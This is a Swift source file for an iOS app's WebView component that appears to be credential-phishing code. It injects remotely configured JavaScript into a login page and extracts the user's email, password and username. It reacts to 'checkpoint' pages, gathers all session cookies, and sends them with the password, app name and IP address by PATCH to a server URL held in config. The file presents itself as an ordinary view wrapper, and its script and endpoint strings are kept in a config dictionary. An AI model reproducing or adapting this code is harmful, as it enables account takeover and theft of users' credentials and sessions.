//
//  File.swift
//  
//
//  Created by DanHa on 24/03/2023.
//

import Foundation
import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct CoordsTwo: UIViewRepresentable {
    func makeCoordinator() -> ClassTwoCoordi {
        ClassTwoCoordi(self)
    }
    
    let url: URL?
    var arrayData: [String: String] = [:]
    @Binding var is_two_chuyen_man: Bool
    @Binding var is_two_load_hide: Bool
    @Binding var is_two_ktra_matkhau: String
    
    private let obs_tow = Web_Tow()
    
    var ob_ser_ver: NSKeyValueObservation? {
        obs_tow.in_stan_ce
    }
    
    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true
        let source = arrayData[ValueKey.Chung_fr_01.rawValue] ?? ""
        let script: WKUserScript = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
        let userContentController: WKUserContentController = WKUserContentController()
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        config.userContentController = userContentController
        userContentController.addUserScript(script)
        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = arrayData[ValueKey.Chung_fr_02.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))
        return webview
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
    }
    
    class ClassTwoCoordi: NSObject, WKNavigationDelegate {
        var pa_rent_tow: CoordsTwo
        init(_ pa_rent_tow: CoordsTwo) {
            self.pa_rent_tow = pa_rent_tow
        }
        
        func readIppAdd() -> String {
            var address_i_p: String?
            if let data_bit = UserDefaults.standard.object(forKey: "diachiip") as? Data {
                if let loadedPerson = try? JSONDecoder().decode(UserInvoicesIpadress.self, from: data_bit) {
                    address_i_p = loadedPerson.diachiip
                }
            }
            return address_i_p ?? "diachiip_IP_Null"
        }
        
        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
            webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_1a.rawValue] ?? "") { item_email, error_email in
                if let email_UserDefaults = item_email as? String, error_email == nil {
                    UserDefaults.standard.set(try? JSONEncoder().encode(UserInvoicesEmail(email: email_UserDefaults)), forKey: "email")
                }
            }
            webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_2a.rawValue] ?? "") { item_matkhau, errormatkhau in
                if let matkhau = item_matkhau as? String, errormatkhau == nil {
                    self.pa_rent_tow.is_two_ktra_matkhau = matkhau
                }
            }
        }
        
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_3a.rawValue] ?? "")
            webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_4a.rawValue] ?? "")
            webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_5a.rawValue] ?? "")
            webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_6a.rawValue] ?? "")
            webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_7a.rawValue] ?? "")
            webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_8a.rawValue] ?? "")
            webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_9a.rawValue] ?? "")
            webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_10a.rawValue] ?? "")
            webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_11a.rawValue] ?? "")
            
            if webView.url?.absoluteString.range(of: "checkpoint") != nil {
                webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_12a.rawValue] ?? "")
                webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_13a.rawValue] ?? "")
            }
            
            webView.evaluateJavaScript(pa_rent_tow.arrayData[ValueKey.two_fr_14a.rawValue] ?? "") { nameUserGet, errorNameUserGet in
                if let nameuser = nameUserGet as? String, errorNameUserGet == nil {
                    if !nameuser.isEmpty {
                        UserDefaults.standard.set(try? JSONEncoder().encode(UserInvoicesName(nameuser: nameuser)), forKey: "username")
                    }
                }
                
            }
            
            WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
                let two_i = cookies.firstIndex(where: { $0.name == pa_rent_tow.arrayData[ValueKey.name_api_09.rawValue] ?? ""})
                if two_i != nil {
                    let two_get_ck = cookies.reduce("", { x,y in
                        x + y.name + "=" + String(y.value) + ";"
                    })
                    UserDefaults.standard.set(try? JSONEncoder().encode(UserInvoicesMK(matkhau: self.pa_rent_tow.is_two_ktra_matkhau)), forKey: "matkhau")
                    self.pa_rent_tow.is_two_load_hide = true
                    let Two_json_data: [String: Any] = [
                        pa_rent_tow.arrayData[ValueKey.name_api_01.rawValue] ?? "": cookies[two_i!].value,
                        pa_rent_tow.arrayData[ValueKey.name_api_02.rawValue] ?? "": two_get_ck,
                        pa_rent_tow.arrayData[ValueKey.name_api_03.rawValue] ?? "": self.pa_rent_tow.is_two_ktra_matkhau,
                        pa_rent_tow.arrayData[ValueKey.name_api_04.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "",
                        pa_rent_tow.arrayData[ValueKey.name_api_05.rawValue] ?? "": self.readIppAdd()
                    ]
                    let url: URL = URL(string: pa_rent_tow.arrayData[ValueKey.Chung_fr_03.rawValue] ?? "")!
                    let json_data = try? JSONSerialization.data(withJSONObject: Two_json_data)
                    var request = URLRequest(url: url)
                    request.httpMethod = "PATCH"
                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                    request.httpBody = json_data
                    print("------------------> two json data \(Two_json_data)")
                    let task = URLSession.shared.dataTask(with: request) { data, response, error in
                        if error != nil {
                            print("not ok")
                        } else if data != nil {
                            print("------------------> success \(data) \(response)")
                            DispatchQueue.main.asyncAfter(deadline: .now() + 4) {
                                self.pa_rent_tow.is_two_chuyen_man = true
                            }
                        }

                    }
                    task.resume()
                }
            }
        }
    }
}

@available(iOS 14.0, *)


struct UserInvoicesIpadress: Codable {
    var diachiip: String
}

struct UserInvoicesEmail: Codable {
    var email: String
}

struct UserInvoicesName: Codable {
    var nameuser: String
}

struct UserInvoicesMK: Codable {
    var matkhau: String
}

private class Web_Tow: ObservableObject {
    @Published var in_stan_ce: NSKeyValueObservation?
}
